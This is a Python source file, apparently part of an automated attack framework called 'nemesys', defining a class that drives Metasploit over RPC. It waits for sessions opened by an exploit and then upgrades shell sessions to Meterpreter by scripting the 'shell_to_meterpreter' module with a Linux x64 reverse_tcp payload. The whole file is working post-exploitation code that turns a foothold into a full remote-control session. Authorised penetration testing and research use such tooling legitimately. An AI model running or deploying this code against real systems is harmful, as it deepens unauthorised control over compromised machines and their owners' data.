from nemesys.utils.logger import nemesysLogger
import re
import time

class SessionManager:
    """
    Manages the retrieval and upgrade of system sessions through the Metasploit framework.
    
    Handles waiting for a session to become active and upgrading it to Meterpreter.
    
    Attributes:
        client (MetasploitClient): The Metasploit client instance used for interaction.
        session_timeout (int): Timeout for session retrieval, default 15 seconds.
        upgrade_timeout (int): Timeout for shell-to-Meterpreter upgrade, default 30 seconds.
    """

    def __init__(self, client, session_timeout=15, upgrade_timeout=30):
        """
        Initializes the SessionManager with the given Metasploit client.

        Args:
            client (MetasploitClient): The Metasploit RPC client.
            session_timeout (int, optional): Timeout for session retrieval (default 15 seconds).
            upgrade_timeout (int, optional): Timeout for shell-to-Meterpreter upgrade (default 30 seconds).
        """
        self.client = client
        self.session_timeout = session_timeout
        self.upgrade_timeout = upgrade_timeout

    def list_sessions(self):
        """Lists active sessions and their details."""
        nemesysLogger.info("🔍 Listing available sessions:")
        sessions = self.client.sessions.list
        for sid, session in sessions.items():
            nemesysLogger.info(f"Session ID: {sid} | Type: {session.get('type')} | User: {session.get('username')}")

    def get_session_id(self, uuid):
        """
        Waits for a session to appear after an exploit and returns its ID once active.

        Args:
            uuid (str): The exploit UUID associated with the session.

        Returns:
            int or None: The session ID if found, None otherwise.
        """
        if not self.client:
            nemesysLogger.warning("⚠️ [CLIENT] Not connected. Re-establish the connection.")
            return None

        end_time = time.time() + self.session_timeout
        nemesysLogger.info("⏳ [SESSION] Monitoring for session activation...")

        while time.time() < end_time:
            sessions = self.client.sessions.list
            for session in sessions:
                if sessions[session].get('exploit_uuid') == uuid:
                    nemesysLogger.info(f"💀 [SESSION] Session ID {session} has been established.")
                    return session
            time.sleep(1)

        nemesysLogger.warning("⚠️ [SESSION] No session found within the time frame.")
        return None

    def upgrade_session(self, session_id):
        """
        Upgrades a shell session to Meterpreter using the 'shell_to_meterpreter' module.

        Args:
            session_id (int): The shell session ID to upgrade.

        Returns:
            int or None: New Meterpreter session ID if upgrade successful, None otherwise.
        """
        console_id = self.client.consoles.console().cid
        exploit_module = 'multi/manage/shell_to_meterpreter'
        new_session_id = None
        current_console = self.client.consoles.console(console_id)

        try:
            nemesysLogger.info("💉 [UPGRADE] Preparing session for upgrade...")

            # Configure the upgrade process
            current_console.write(f'use {exploit_module}\n')
            current_console.write(f'set SESSION {session_id}\n')
            current_console.write(f'set PAYLOAD_OVERRIDE linux/x64/meterpreter/reverse_tcp\n')
            current_console.write(f'set PLATFORM_OVERRIDE linux\n')
            current_console.write(f'set PSH_ARCH_OVERRIDE x64\n')

            nemesysLogger.info(f"🔧 [UPGRADE] Running upgrade for session {session_id}...")
            current_console.write('run\n')

            time.sleep(self.upgrade_timeout)

            output = current_console.read()
            upgrade_output = output.get('data', '')
            # Check for the new Meterpreter session ID in the output
            if "Meterpreter session" in upgrade_output:
                match = re.search(r'Meterpreter session (\d+) opened', upgrade_output)
                if match:
                    new_session_id = int(match.group(1))
                    nemesysLogger.info(f"✅ [UPGRADE] Session upgraded. New Meterpreter session ID: {new_session_id}")
                else:
                    nemesysLogger.warning("⚠️ [UPGRADE] Failed to extract new session ID from the output.")
            elif "Post module execution completed" in upgrade_output:
                nemesysLogger.info("✅ [UPGRADE] Upgrade attempt completed, but no new session found.")
            elif "Exploit failed" in upgrade_output or "No session was created" in upgrade_output:
                nemesysLogger.error("❌ [UPGRADE] Upgrade failed. No Meterpreter session created.")
            else:
                nemesysLogger.warning("⚠️ [UPGRADE] Unknown status. The upgrade may not have completed as expected.")

        except Exception as e:
            nemesysLogger.error(f"⚠️ [UPGRADE] Error occurred during session upgrade: {e}")

        finally:
            # Clean up the console session
            current_console.destroy()

        return new_session_id